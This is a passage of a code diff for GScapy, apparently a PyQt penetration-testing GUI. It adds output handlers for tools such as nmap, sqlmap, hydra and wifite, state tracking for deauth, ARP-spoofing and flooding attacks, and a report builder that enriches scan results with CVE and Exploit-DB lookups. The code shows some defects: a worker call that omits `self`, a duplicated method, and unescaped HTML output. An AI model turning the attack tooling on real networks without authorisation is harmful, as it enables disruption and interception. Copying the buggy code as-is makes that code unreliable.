+            self.status_bar.showMessage("Report generation successful.", 5000)
+        else:
+            QMessageBox.critical(self, "Report Generation Error", f"Failed to generate report:\n{message}")
+            self.status_bar.showMessage("Report generation failed.", 5000)
+
+    def _handle_report_finding(self, finding_data):
+        """Adds a finding to the report tree. finding_data is a tuple."""
+        # The data should be (host, port_service, finding, details)
+        item = QTreeWidgetItem([str(col) for col in finding_data])
+        self.report_findings_tree.addTopLevelItem(item)
+
+    def _handle_aggregation(self):
+        """Starts the background thread for aggregating and enriching tool results."""
+        if not self.nmap_last_xml:
+            QMessageBox.warning(self, "No Data", "No Nmap scan data is available to analyze. Please run an Nmap scan with XML output first.")
+            return
+
+        self.report_aggregate_btn.setEnabled(False)
+        self.report_findings_tree.clear()
+        self.status_bar.showMessage("Aggregating and enriching results...")
+
+        self.worker = WorkerThread(self._aggregation_thread, args=(self,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _aggregation_thread(self):
+        """Parses tool outputs, enriches data, and sends it to the reporting tab."""
+        q = self.tool_results_queue
+        try:
+            if not LXML_AVAILABLE:
+                q.put(('error', 'Dependency Error', "The 'lxml' library is required for report generation. Please install it."))
+                return
+
+            parser = etree.XMLParser(recover=True, no_network=True, dtd_validation=False)
+            root = etree.fromstring(self.nmap_last_xml.encode('utf-8'), parser=parser)
+
+            for host in root.findall('host'):
+                if host.find('status').get('state') != 'up':
+                    continue
+
+                address = host.find('address').get('addr')
+                ports_elem = host.find('ports')
+                if ports_elem is None:
+                    continue
+
+                for port in ports_elem.findall('port'):
+                    if port.find('state').get('state') != 'open':
+                        continue
+
+                    port_id = port.get('portid')
+                    protocol = port.get('protocol')
+                    port_service_str = f"{port_id}/{protocol}"
+
+                    service_elem = port.find('service')
+                    if service_elem is not None:
+                        service_name = service_elem.get('name', 'N/A')
+                        product = service_elem.get('product', '')
+                        version = service_elem.get('version', '')
+
+                        # Construct a search term, prioritizing product and version
+                        search_term = f"{product} {version}".strip()
+                        if not search_term:
+                            search_term = service_name
+
+                        full_service_str = f"{service_name} ({search_term})"
+
+                        # Enrich data with CVEs and Exploits
+                        cve_details = self._query_cve_api(search_term)
+                        exploit_details = self._query_searchsploit(search_term)
+
+                        q.put(('report_finding', (address, port_service_str, full_service_str, f"{cve_details}\n{exploit_details}")))
+
+        except Exception as e:
+            logging.error(f"Error during result aggregation: {e}", exc_info=True)
+            q.put(('error', 'Aggregation Error', f'An error occurred: {e}'))
+        finally:
+            q.put(('tool_finished', 'aggregation'))
+
+    def _handle_generate_report(self):
+        """Handles the report generation process by gathering data and starting a worker."""
+        # 1. Gather all data from the UI
+        report_data = {
+            "client": self.report_client_name.text(),
+            "dates": self.report_assessment_dates.text(),
+            "objectives": self.report_objectives.toPlainText(),
+            "in_scope": self.report_in_scope.toPlainText(),
+            "out_of_scope": self.report_out_of_scope.toPlainText(),
+            "summary": self.report_summary_text.toPlainText(),
+            "findings": []
+        }
+
+        if self.report_findings_tree.topLevelItemCount() == 0:
+            QMessageBox.warning(self, "No Data", "There are no findings to report. Please run the 'Aggregate & Enrich Results' tool first.")
+            return
+
+        for i in range(self.report_findings_tree.topLevelItemCount()):
+            item = self.report_findings_tree.topLevelItem(i)
+            report_data["findings"].append({
+                "host": item.text(0),
+                "service": item.text(1),
+                "finding": item.text(2),
+                "details": item.text(3)
+            })
+
+        # 2. Prompt user for save location
+        file_path, _ = QFileDialog.getSaveFileName(self, "Save Report", "GScapy_Report.html", "HTML Files (*.html)", options=QFileDialog.Option.DontUseNativeDialog)
+        if not file_path:
+            return
+
+        template_name = self.report_template_combo.currentText()
+
+        # 3. Start worker thread
+        self.status_bar.showMessage("Generating report...")
+        self.report_generate_btn.setEnabled(False)
+        self.worker = WorkerThread(_report_generation_thread, args=(self, report_data, file_path, template_name))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _report_generation_thread(self, report_data, file_path, template_name):
+        """Worker thread to generate the final HTML report."""
+        q = self.tool_results_queue
+        try:
+            template_path = os.path.join("report_templates", template_name)
+            with open(template_path, 'r', encoding='utf-8') as f:
+                template_html = f.read()
+
+            findings_html = ""
+            for finding in report_data['findings']:
+                findings_html += "<tr>\n"
+                findings_html += f"    <td>{finding['host']}</td>\n"
+                findings_html += f"    <td>{finding['service']}</td>\n"
+                findings_html += f"    <td>{finding['finding']}</td>\n"
+                findings_html += f"    <td><pre>{finding['details']}</pre></td>\n"
+                findings_html += "</tr>\n"
+
+            # Sanitize and format the data
+            sanitized_data = {k: v.replace('<', '&lt;').replace('>', '&gt;') if isinstance(v, str) else v for k, v in report_data.items()}
+
+            final_html = template_html.format(
+                client=sanitized_data['client'],
+                dates=sanitized_data['dates'],
+                objectives=sanitized_data['objectives'],
+                in_scope=sanitized_data['in_scope'],
+                out_of_scope=sanitized_data['out_of_scope'],
+                summary=sanitized_data['summary'].replace('\n', '<br>'),
+                findings_loop=findings_html
+            )
+
+            with open(file_path, 'w', encoding='utf-8') as f:
+                f.write(final_html)
+
+            q.put(('report_finished', True, file_path))
+
+        except Exception as e:
+            logging.error(f"Error during report generation: {e}", exc_info=True)
+            q.put(('report_finished', False, str(e)))
+
+    def _query_cve_api(self, keyword):
+        """Queries the NVD CVE API for a given keyword and returns a formatted string."""
+        if not keyword:
+            return "No service info to query CVEs."
+        try:
+            # URL-encode the keyword to handle spaces and special characters
+            encoded_keyword = urllib.parse.quote(keyword)
+            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={encoded_keyword}&resultsPerPage=5"
+
+            # Add a user-agent to be compliant with API usage policies
+            req = urllib.request.Request(url, headers={'User-Agent': 'GScapy/1.0'})
+
+            with urllib.request.urlopen(req, timeout=10) as response:
+                data = json.load(response)
+
+            vulnerabilities = data.get('vulnerabilities', [])
+            if not vulnerabilities:
+                return "No CVEs found."
+
+            output = ["--- CVEs ---"]
+            for item in vulnerabilities:
+                cve = item.get('cve', {})
+                cve_id = cve.get('id', 'N/A')
+
+                # Get description
+                description = "No description available."
+                for desc in cve.get('descriptions', []):
+                    if desc.get('lang') == 'en':
+                        description = desc.get('value', '')
+                        break
+
+                # Get CVSS V3 score if available, otherwise V2
+                cvss_score = "N/A"
+                if 'cvssMetricV31' in cve.get('metrics', {}):
+                    cvss_score = cve['metrics']['cvssMetricV31'][0]['cvssData']['baseScore']
+                elif 'cvssMetricV2' in cve.get('metrics', {}):
+                    cvss_score = cve['metrics']['cvssMetricV2'][0]['cvssData']['baseScore']
+
+                output.append(f"{cve_id} (Score: {cvss_score}): {description[:100]}...")
+            return "\n".join(output)
+
+        except Exception as e:
+            logging.error(f"CVE API query for '{keyword}' failed: {e}")
+            return f"CVE lookup failed: {e}"
+
+    def _query_searchsploit(self, keyword):
+        """Queries the local searchsploit database and returns a formatted string."""
+        if not keyword:
+            return "No service info to query exploits."
+
+        if not shutil.which("searchsploit"):
+            return "searchsploit command not found. Please install Exploit-DB."
+
+        try:
+            command = ["searchsploit", "--json", keyword]
+            process = subprocess.run(command, capture_output=True, text=True, timeout=15)
+
+            if process.returncode != 0:
+                return f"Searchsploit error: {process.stderr}"
+
+            data = json.loads(process.stdout)
+            results = data.get('RESULTS_EXPLOIT', [])
+
+            if not results:
+                return "No exploits found."
+
+            output = ["--- Exploits ---"]
+            for item in results[:5]: # Limit to top 5 results
+                title = item.get('Title', 'N/A')
+                edb_id = item.get('EDB-ID', 'N/A')
+                output.append(f"EDB-ID: {edb_id} - {title}")
+            return "\n".join(output)
+
+        except Exception as e:
+            logging.error(f"Searchsploit query for '{keyword}' failed: {e}")
+            return f"Exploit lookup failed: {e}"
+
+    def _show_subdomain_results_popup(self, domain, subdomains):
+        """Shows the results of a subdomain scan in a dedicated dialog."""
+        if not subdomains:
+            QMessageBox.information(self, "No Results", f"No subdomains were found for {domain}.")
+            return
+        dialog = SubdomainResultsDialog(subdomains, domain, self)
+        dialog.exec()
+
+    def _handle_sublist3r_output(self, line):
+        self.sublist3r_output.insertPlainText(line)
+        self.sublist3r_output.verticalScrollBar().setValue(self.sublist3r_output.verticalScrollBar().maximum())
+
+    def _handle_wifite_output(self, line):
+        self.wifite_output_console.insertPlainText(line)
+        self.wifite_output_console.verticalScrollBar().setValue(self.wifite_output_console.verticalScrollBar().maximum())
+
+    def _handle_nikto_output(self, line):
+        self.nikto_output_console.insertPlainText(line)
+        self.nikto_output_console.verticalScrollBar().setValue(self.nikto_output_console.verticalScrollBar().maximum())
+
+    def _handle_gobuster_output(self, line):
+        self.gobuster_output_console.insertPlainText(line)
+        self.gobuster_output_console.verticalScrollBar().setValue(self.gobuster_output_console.verticalScrollBar().maximum())
+
+    def _handle_sqlmap_output(self, line):
+        self.sqlmap_output_console.insertPlainText(line)
+        self.sqlmap_output_console.verticalScrollBar().setValue(self.sqlmap_output_console.verticalScrollBar().maximum())
+
+    def _handle_whatweb_output(self, line):
+        self.whatweb_output_console.insertPlainText(line)
+        self.whatweb_output_console.verticalScrollBar().setValue(self.whatweb_output_console.verticalScrollBar().maximum())
+
+    def _handle_hashcat_output(self, line):
+        self.hashcat_output_console.insertPlainText(line)
+        self.hashcat_output_console.verticalScrollBar().setValue(self.hashcat_output_console.verticalScrollBar().maximum())
+
+    def _handle_masscan_output(self, line):
+        self.masscan_output_console.insertPlainText(line)
+        self.masscan_output_console.verticalScrollBar().setValue(self.masscan_output_console.verticalScrollBar().maximum())
+
+    def _handle_nmap_output(self, line):
+        self.nmap_output_console.insertPlainText(line)
+        self.nmap_output_console.verticalScrollBar().setValue(self.nmap_output_console.verticalScrollBar().maximum())
+
+    def _handle_nmap_xml_result(self, xml_content):
+        """Stores the captured Nmap XML report and shows a summary dialog."""
+        self.nmap_last_xml = xml_content
+        logging.info(f"Captured Nmap XML report ({len(xml_content)} bytes).")
+        self.status_bar.showMessage("Nmap scan complete. XML report captured.", 5000)
+        self.nmap_controls['report_btn'].setEnabled(True)
+
+        # Automatically show the summary dialog
+        target_context = self.nmap_controls['target_edit'].text()
+        summary_dialog = NmapSummaryDialog(xml_content, target_context, self)
+        summary_dialog.exec()
+
+    def _show_subdomain_results_popup(self, domain, subdomains):
+        """Shows the results of a subdomain scan in a dedicated dialog."""
+        if not subdomains:
+            QMessageBox.information(self, "No Results", f"No subdomains were found for {domain}.")
+            return
+        dialog = SubdomainResultsDialog(subdomains, domain, self)
+        dialog.exec()
+
+    def _show_httpx_results_popup(self, json_data):
+        """Shows the results of an httpx scan in a dedicated dialog."""
+        dialog = HttpxResultsDialog(json_data, self)
+        dialog.exec()
+
+    def _show_dirsearch_results_popup(self, json_data, target_context):
+        """Shows the results of a dirsearch scan in a dedicated dialog."""
+        dialog = DirsearchResultsDialog(json_data, target_context, self)
+        dialog.exec()
+
+    def _show_ffuf_results_popup(self, json_data):
+        """Shows the results of an ffuf scan in a dedicated dialog."""
+        dialog = FfufResultsDialog(json_data, self)
+        dialog.exec()
+
+    def _show_nuclei_results_popup(self, json_data):
+        """Shows the results of a nuclei scan in a dedicated dialog."""
+        dialog = NucleiResultsDialog(json_data, self)
+        dialog.exec()
+
+    def _show_trufflehog_results_popup(self, json_data):
+        """Shows the results of a trufflehog scan in a dedicated dialog."""
+        dialog = TruffleHogResultsDialog(json_data, self)
+        dialog.exec()
+
+    def _show_enum4linux_ng_results_popup(self, json_data, target_context):
+        """Shows the results of an enum4linux-ng scan in a dedicated dialog."""
+        dialog = Enum4LinuxNGResultsDialog(json_data, target_context, self)
+        dialog.exec()
+
+    def _show_dnsrecon_results_popup(self, json_data, target_context):
+        """Shows the results of a dnsrecon scan in a dedicated dialog."""
+        dialog = DnsReconResultsDialog(json_data, target_context, self)
+        dialog.exec()
+
+    def _show_sherlock_results_popup(self, csv_data, target_context):
+        """Shows the results of a sherlock scan in a dedicated dialog."""
+        dialog = SherlockResultsDialog(csv_data, target_context, self)
+        dialog.exec()
+
+    def _handle_send_results(self, ans, unans):
+        self.send_results_widget.clear()
+        for i, (s, r) in enumerate(ans):
+            self.send_results_widget.addTopLevelItem(QTreeWidgetItem([str(i+1), s.summary(), r.summary()]))
+        start_num = len(ans)
+        for i, s in enumerate(unans):
+            self.send_results_widget.addTopLevelItem(QTreeWidgetItem([str(start_num+i+1), s.summary(), "No response"]))
+
+    def _handle_send_finished(self):
+        self.send_btn.setEnabled(True)
+        self.send_cancel_btn.setEnabled(False)
+
+    def _handle_status_update(self, tool_name, status_text):
+        widgets = {'trace': self.trace_status, 'scan': self.scan_status, 'arp': self.arp_status,
+                   'flood': self.flood_status, 'fw': self.fw_status, 'wifi_scan': self.wifi_scan_status,
+                   'deauth': self.deauth_status, 'arp_spoof': self.arp_spoof_status,
+                   'bf': self.bf_status_label, 'ps': self.ps_status_label}
+        if tool_name in widgets:
+            widgets[tool_name].setText(status_text)
+
+    def _handle_clear_update(self, tool_name):
+        widgets = {'trace': self.trace_tree, 'scan': self.scan_tree, 'arp': self.arp_tree,
+                   'fw': self.fw_tree, 'wifi_scan': self.wifi_tree}
+        if tool_name in widgets:
+            widgets[tool_name].clear()
+
+    def _handle_result_update(self, tool_name, result_data):
+        widgets = {'trace': self.trace_tree, 'scan': self.scan_tree, 'fw': self.fw_tree,
+                   'wifi_scan': self.wifi_tree, 'ps': self.ps_tree}
+        if tool_name in widgets:
+            widgets[tool_name].addTopLevelItem(QTreeWidgetItem([str(x) for x in result_data]))
+
+    def _handle_arp_results(self, results):
+        for res in results:
+            self.arp_tree.addTopLevelItem(QTreeWidgetItem([res['ip'], res['mac'], res['status']]))
+
+    def _handle_crunch_finished(self, outfile, returncode):
+        if returncode == 0:
+            self.wpa_crack_output.appendPlainText(f"Crunch finished successfully. Wordlist saved to:\n{outfile}")
+            self.wpa_wordlist_edit.setText(outfile)
+        else:
+            self.wpa_crack_output.appendPlainText(f"Crunch finished with an error (code: {returncode}). Check gscapy.log for details.")
+
+    def _handle_ps_worker_finished(self, total_threads):
+        with self.ps_thread_lock:
+            self.ps_finished_threads += 1
+            if self.ps_finished_threads >= total_threads:
+                if self.tool_stop_event.is_set():
+                    self.ps_status_label.setText("Ping sweep canceled.")
+                else:
+                    self.ps_status_label.setText("Ping sweep complete.")
+                self.tool_results_queue.put(('tool_finished', 'ping_sweep'))
+
+    def _handle_flood_thread_finished(self, total_threads):
+        with self.thread_finish_lock:
+            self.finished_thread_count += 1
+            if self.finished_thread_count >= total_threads:
+                self.is_tool_running = False
+                self.flood_button.setEnabled(True)
+                self.stop_flood_button.setEnabled(False)
+                if self.tool_stop_event.is_set():
+                    self.flood_status.setText("Flood Canceled.")
+                else:
+                    self.flood_status.setText("Flood complete.")
+
+    def _handle_tool_finished(self, tool):
+        if tool == 'aggregation':
+            self.report_aggregate_btn.setEnabled(True)
+            self.status_bar.showMessage("Result aggregation and enrichment complete.", 5000)
+            return
+
+        self.is_tool_running = False
+        buttons = {'traceroute': self.trace_button, 'scanner': self.scan_button, 'arp_scan': self.arp_scan_button,
+                   'flooder': self.flood_button, 'fw_tester': self.fw_test_button, 'wifi_scan': self.wifi_scan_button,
+                   'deauth': self.deauth_button, 'arp_spoof': self.arp_spoof_start_btn,
+                   'beacon_flood': self.bf_start_button, 'ping_sweep': self.ps_start_button, 'nmap_scan': self.nmap_controls['start_btn'],
+                          'sublist3r_scan': self.subdomain_controls['start_btn'], 'subfinder_scan': self.subfinder_controls['start_btn'], 'httpx_scan': self.httpx_controls['start_btn'], 'trufflehog_scan': self.trufflehog_controls['start_btn'], 'rustscan_scan': self.rustscan_controls['start_btn'], 'dirsearch_scan': self.dirsearch_controls['start_btn'], 'ffuf_scan': self.ffuf_controls['start_btn'], 'jtr_scan': self.jtr_controls['start_btn'], 'hydra_scan': self.hydra_controls['start_btn'], 'enum4linux_ng_scan': self.enum4linux_ng_controls['start_btn'], 'dnsrecon_scan': self.dnsrecon_controls['start_btn'], 'fierce_scan': self.fierce_controls['start_btn'], 'sherlock_scan': self.sherlock_controls['start_btn'], 'spiderfoot_scan': self.spiderfoot_controls['start_btn'], 'arp_scan_cli_scan': self.arp_scan_cli_controls['start_btn'], 'wifite_scan': self.wifite_start_btn, 'nikto_scan': self.nikto_controls['start_btn'], 'gobuster_scan': self.gobuster_controls['start_btn'], 'sqlmap_scan': self.sqlmap_start_btn, 'whatweb_scan': self.whatweb_start_btn, 'hashcat_scan': self.hashcat_start_btn, 'masscan_scan': self.masscan_start_btn, 'nuclei_scan': self.nuclei_controls['start_btn'],
+                           'cve_search': self.cve_search_button,
+                           'exploit_search': self.exploitdb_search_button}
+        cancel_buttons = {'scanner': self.scan_cancel_button, 'flooder': self.stop_flood_button,
+                          'arp_spoof': self.arp_spoof_stop_btn, 'beacon_flood': self.bf_stop_button,
+                          'ping_sweep': self.ps_cancel_button, 'fw_tester': self.fw_cancel_button,
+                          'traceroute': self.trace_cancel_button, 'wifi_scan': self.wifi_scan_stop_button, 'nmap_scan': self.nmap_controls['cancel_btn'],
+                          'sublist3r_scan': self.subdomain_controls['cancel_btn'], 'subfinder_scan': self.subfinder_controls['cancel_btn'], 'httpx_scan': self.httpx_controls['cancel_btn'], 'trufflehog_scan': self.trufflehog_controls['stop_btn'], 'rustscan_scan': self.rustscan_controls['cancel_btn'], 'dirsearch_scan': self.dirsearch_controls['stop_btn'], 'ffuf_scan': self.ffuf_controls['stop_btn'], 'jtr_scan': self.jtr_controls['stop_btn'], 'hydra_scan': self.hydra_controls['stop_btn'], 'enum4linux_ng_scan': self.enum4linux_ng_controls['stop_btn'], 'dnsrecon_scan': self.dnsrecon_controls['stop_btn'], 'fierce_scan': self.fierce_controls['stop_btn'], 'sherlock_scan': self.sherlock_controls['stop_btn'], 'spiderfoot_scan': self.spiderfoot_controls['stop_btn'], 'arp_scan_cli_scan': self.arp_scan_cli_controls['stop_btn'], 'wifite_scan': self.wifite_stop_btn, 'nikto_scan': self.nikto_controls['stop_btn'], 'gobuster_scan': self.gobuster_controls['stop_btn'], 'sqlmap_scan': self.sqlmap_stop_btn, 'whatweb_scan': self.whatweb_stop_btn, 'hashcat_scan': self.hashcat_stop_btn, 'masscan_scan': self.masscan_stop_btn, 'nuclei_scan': self.nuclei_controls['stop_btn']}
+
+        if tool == 'lab_chain':
+            self.lab_run_chain_btn.setEnabled(True)
+            self.status_bar.showMessage("LAB chain finished.", 5000)
+            return
+
+        if tool == 'jtr_scan':
+            self.jtr_controls['start_btn'].setEnabled(True)
+            self.jtr_controls['show_btn'].setEnabled(True)
+            self.jtr_controls['stop_btn'].setEnabled(False)
+            return
+
+        if tool == 'arp_spoof':
+            if self.arp_spoof_current_victim and self.arp_spoof_current_target:
+                self._restore_arp(self.arp_spoof_current_victim, self.arp_spoof_current_target)
+                self.arp_spoof_current_victim = None
+                self.arp_spoof_current_target = None
+
+        if tool in buttons:
+            buttons[tool].setEnabled(True)
+        if tool in cancel_buttons:
+            cancel_buttons[tool].setEnabled(False)
+
+        if self.tool_stop_event.is_set():
+            status_labels = {'scanner': self.scan_status, 'traceroute': self.trace_status}
+            if tool in status_labels:
+                status_labels[tool].setText("Canceled by user.")
+
+    def _handle_cve_search_status(self, status_text):
+        self.status_bar.showMessage(status_text, 5000)
+
+    def _handle_cve_result(self, result_data, cve_object):
+        """Adds a CVE result to the table and stores the full object."""
+        item = QTreeWidgetItem(result_data)
+        item.setData(0, Qt.ItemDataRole.UserRole, cve_object) # Store the full object
+        self.cve_results_table.addTopLevelItem(item)
+
+    def _handle_exploit_search_status(self, status_text):
+        self.status_bar.showMessage(status_text, 5000)
+
+    def _handle_exploit_search_results(self, results):
+        """Adds exploit search results to the table."""
+        self.exploitdb_results_table.clear()
+        for result in results:
+            item = QTreeWidgetItem(result)
+            self.exploitdb_results_table.addTopLevelItem(item)
+
+    def _handle_lab_status(self, status_text):
+        self.status_bar.showMessage(status_text, 0) # 0 means it stays until changed
+
+    def _handle_error(self, title, text):
+        QMessageBox.critical(self, title, text)
+
+    def _create_export_button(self, source_widget):
+        button = QPushButton("Export Results")
+        button.setToolTip("Export the results to a file (CSV, HTML, PDF, DOCX).")
+        button.clicked.connect(lambda: self._handle_export(source_widget))
+        return button
+
+    def _handle_export(self, source_widget):
+        if source_widget.topLevelItemCount() == 0:
+            QMessageBox.information(self, "No Data", "There is no data to export.")
+            return
+
+        formats = "HTML (*.html);;CSV (*.csv);;PDF (*.pdf);;Word Document (*.docx)"
+        file_path, selected_format = QFileDialog.getSaveFileName(self, "Export Results", "", formats, options=QFileDialog.Option.DontUseNativeDialog)
+
+        if not file_path:
+            return
+
+        try:
+            if 'html' in selected_format:
+                self._export_to_html(source_widget, file_path)
+            elif 'csv' in selected_format:
+                self._export_to_csv(source_widget, file_path)
+            elif 'pdf' in selected_format:
+                self._export_to_pdf(source_widget, file_path)
+            elif 'docx' in selected_format:
+                self._export_to_docx(source_widget, file_path)
+            else:
+                QMessageBox.warning(self, "Unsupported Format", "Selected file format is not supported.")
+                return
+            self.status_bar.showMessage(f"Successfully exported results to {file_path}")
+        except NameError:
+            logging.error("Export failed due to missing optional dependencies.", exc_info=True)
+            QMessageBox.critical(self, "Dependency Error", "Optional libraries for PDF/DOCX export are not installed.\nPlease run: pip install reportlab python-docx")
+        except Exception as e:
+            logging.error(f"Failed to export results: {e}", exc_info=True)
+            QMessageBox.critical(self, "Export Error", f"An error occurred during export:\n{e}")
+
+    def _export_to_csv(self, tree_widget, file_path):
+        with open(file_path, 'w', newline='', encoding='utf-8') as f:
+            writer = csv.writer(f)
+            header = [tree_widget.headerItem().text(i) for i in range(tree_widget.columnCount())]
+            writer.writerow(header)
+            for i in range(tree_widget.topLevelItemCount()):
+                item = tree_widget.topLevelItem(i)
+                row = [item.text(j) for j in range(tree_widget.columnCount())]
+                writer.writerow(row)
+
+    def _export_to_html(self, tree_widget, file_path):
+        with open(file_path, 'w', encoding='utf-8') as f:
+            f.write("<html><head><title>Exported Results</title>")
+            f.write("<style>body { font-family: sans-serif; } table { border-collapse: collapse; width: 100%; }")
+            f.write("th, td { border: 1px solid #dddddd; text-align: left; padding: 8px; }")
+            f.write("tr:nth-child(even) { background-color: #f2f2f2; }</style></head><body>")
+            f.write("<h2>Exported Results</h2><table><tr>")
+            header = [tree_widget.headerItem().text(i) for i in range(tree_widget.columnCount())]
+            for h in header:
+                f.write(f"<th>{h}</th>")
+            f.write("</tr>")
+            for i in range(tree_widget.topLevelItemCount()):
+                f.write("<tr>")
+                item = tree_widget.topLevelItem(i)
+                for j in range(tree_widget.columnCount()):
+                    f.write(f"<td>{item.text(j)}</td>")
+                f.write("</tr>")
+            f.write("</table></body></html>")
+
+    def _export_to_pdf(self, tree_widget, file_path):
+        doc = SimpleDocTemplate(file_path)
+        elements = []
+        styles = getSampleStyleSheet()
+        elements.append(Paragraph("GScapy Exported Results", styles['h1']))
+
+        header = [tree_widget.headerItem().text(i) for i in range(tree_widget.columnCount())]
+        data = [header]
+        for i in range(tree_widget.topLevelItemCount()):
+            row = [tree_widget.topLevelItem(i).text(j) for j in range(tree_widget.columnCount())]
+            data.append(row)
+
+        table = Table(data)
+        style = TableStyle([
+            ('BACKGROUND', (0,0), (-1,0), colors.grey),
+            ('TEXTCOLOR',(0,0),(-1,0),colors.whitesmoke),
+            ('ALIGN', (0,0), (-1,-1), 'CENTER'),
+            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
+            ('BOTTOMPADDING', (0,0), (-1,0), 12),
+            ('BACKGROUND', (0,1), (-1,-1), colors.beige),
+            ('GRID', (0,0), (-1,-1), 1, colors.black)
+        ])
+        table.setStyle(style)
+        elements.append(table)
+        doc.build(elements)
+
+    def _export_to_docx(self, tree_widget, file_path):
+        document = docx.Document()
+        document.add_heading('GScapy Exported Results', 0)
+
+        header = [tree_widget.headerItem().text(i) for i in range(tree_widget.columnCount())]
+
+        table = document.add_table(rows=1, cols=len(header))
+        table.style = 'Light Shading Accent 1'
+        hdr_cells = table.rows[0].cells
+        for i, h in enumerate(header):
+            hdr_cells[i].text = h
+
+        for i in range(tree_widget.topLevelItemCount()):
+            row_cells = table.add_row().cells
+            item = tree_widget.topLevelItem(i)
+            for j in range(tree_widget.columnCount()):
+                row_cells[j].text = item.text(j)
+
+        document.save(file_path)
+
+    def _update_tool_targets(self):
+        """Automatically updates tool target fields based on the selected interface."""
+        iface_name = self.get_selected_iface()
+
+        network_cidr = "192.168.1.0/24" # Default fallback
+        if iface_name and iface_name != "Automatic":
+            try:
+                addrs = psutil.net_if_addrs().get(iface_name, [])
+                for addr in addrs:
+                    if addr.family == socket.AF_INET:
+                        ip = addr.address
+                        netmask = addr.netmask
+                        if ip and netmask:
+                            # Use ipaddress module to calculate network CIDR
+                            host_iface = ipaddress.IPv4Interface(f"{ip}/{netmask}")
+                            network_cidr = host_iface.network.with_prefixlen
+                            logging.info(f"Updated tool targets for interface {iface_name} to {network_cidr}")
+                            break # Found the IPv4 addr, no need to continue
+            except Exception as e:
+                logging.error(f"Could not auto-populate tool targets for {iface_name}: {e}")
+                # Keep the default fallback
+
+        # Update all relevant tool fields
+        if hasattr(self, 'arp_target'):
+            self.arp_target.setText(network_cidr)
+        if hasattr(self, 'ps_target_edit'):
+            self.ps_target_edit.setText(network_cidr)
+
+    def closeEvent(self, event):
+        """Shows a confirmation dialog and ensures background threads are stopped on exit."""
+        reply = QMessageBox.question(self, 'Exit Confirmation',
+                                     "Are you sure you want to exit?",
+                                     QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
+                                     QMessageBox.StandardButton.No)
+
+        if reply == QMessageBox.StandardButton.Yes:
+            logging.info("User confirmed exit. Stopping background threads.")
+            if self.sniffer_thread and self.sniffer_thread.isRunning(): self.sniffer_thread.stop()
+            if self.channel_hopper and self.channel_hopper.isRunning(): self.channel_hopper.stop()
+            if self.resource_monitor_thread and self.resource_monitor_thread.isRunning():
+                self.resource_monitor_thread.stop()
+            logging.info("GScapy application closing.")
+            event.accept()
+        else:
+            logging.info("User canceled exit.")
+            event.ignore()
+
+    def _create_reporting_tab(self):
+        """Creates the UI for the Reporting & Analysis tab."""
+        widget = QWidget()
+        main_layout = QHBoxLayout(widget)
+        main_splitter = QSplitter(Qt.Orientation.Horizontal)
+
+        # --- Left Panel: Configuration & Narrative ---
+        left_panel = QWidget()
+        left_layout = QVBoxLayout(left_panel)
+        left_layout.setContentsMargins(0,0,0,0)
+
+        # Rules of Engagement Box
+        roe_box = QGroupBox("Rules of Engagement (ROE)")
+        roe_layout = QFormLayout(roe_box)
+        self.report_client_name = QLineEdit()
+        self.report_assessment_dates = QLineEdit()
+        self.report_objectives = QTextEdit()
+        self.report_in_scope = QTextEdit()
+        self.report_out_of_scope = QTextEdit()
+        roe_layout.addRow("Client Name:", self.report_client_name)
+        roe_layout.addRow("Assessment Dates:", self.report_assessment_dates)
+        roe_layout.addRow("Objectives:", self.report_objectives)
+        roe_layout.addRow("In-Scope Targets:", self.report_in_scope)
+        roe_layout.addRow("Out-of-Scope & Restrictions:", self.report_out_of_scope)
+        left_layout.addWidget(roe_box)
+
+        # Executive Summary Box
+        summary_box = QGroupBox("Executive Summary")
+        summary_layout = QVBoxLayout(summary_box)
+        self.report_summary_text = QTextEdit()
+        self.report_summary_text.setPlaceholderText("Write a high-level summary of the assessment's findings and recommendations for a non-technical audience, or generate one with AI.")
+
+        ai_summary_btn = QPushButton(QIcon("icons/terminal.svg"), " Generate Summary with AI")
+        ai_summary_btn.clicked.connect(self._handle_ai_summary_generation)
+
+        summary_layout.addWidget(self.report_summary_text)
+        summary_layout.addWidget(ai_summary_btn)
+        left_layout.addWidget(summary_box)
+
+        left_panel.setLayout(left_layout)
+
+        # --- Right Panel: Findings & Generation ---
+        right_panel = QWidget()
+        right_layout = QVBoxLayout(right_panel)
+        right_layout.setContentsMargins(0,0,0,0)
+
+        # Findings Box
+        findings_box = QGroupBox("Aggregated Findings")
+        findings_layout = QVBoxLayout(findings_box)
+
+        self.report_aggregate_btn = QPushButton(QIcon("icons/search.svg"), " Aggregate & Enrich Results")
+        self.report_aggregate_btn.setToolTip("Scan the results from all tool outputs in the current session and enrich them with CVE and Exploit-DB information.")
+        self.report_aggregate_btn.clicked.connect(self._handle_aggregation)
+        findings_layout.addWidget(self.report_aggregate_btn)
+
+        self.report_findings_tree = QTreeWidget()
+        self.report_findings_tree.setColumnCount(4)
+        self.report_findings_tree.setHeaderLabels(["Host", "Port/Service", "Vulnerability/Finding", "Details (CVE/Exploit)"])
+        self.report_findings_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
+        self.report_findings_tree.header().setStretchLastSection(True)
+        findings_layout.addWidget(self.report_findings_tree)
+        right_layout.addWidget(findings_box)
+
+        # Generation Box
+        generation_box = QGroupBox("Generate Report")
+        generation_layout = QFormLayout(generation_box)
+
+        self.report_template_combo = QComboBox()
+        try:
+            templates = [f for f in os.listdir("report_templates") if f.endswith('.html')]
+            self.report_template_combo.addItems(templates)
+        except FileNotFoundError:
+            logging.error("report_templates directory not found. Report generation may fail.")
+            self.report_template_combo.addItem("default_report.html")
+
+        generation_layout.addRow("Template:", self.report_template_combo)
+
+        self.report_generate_btn = QPushButton(QIcon("icons/file-text.svg"), "Generate Report")
+        self.report_generate_btn.setToolTip("Compile all the information above into a final report document.")
+        self.report_generate_btn.clicked.connect(self._handle_generate_report)
+        generation_layout.addRow(self.report_generate_btn)
+        right_layout.addWidget(generation_box)
+
+        right_panel.setLayout(right_layout)
+
+        # --- Add panels to splitter ---
+        main_splitter.addWidget(left_panel)
+        main_splitter.addWidget(right_panel)
+        main_splitter.setSizes([400, 600]) # Initial sizing
+        main_layout.addWidget(main_splitter)
+
+        return widget
+
+    def _handle_ai_summary_generation(self):
+        """Gathers findings, sends them to the AI, and sets a callback to populate the summary."""
+        if self.report_findings_tree.topLevelItemCount() == 0:
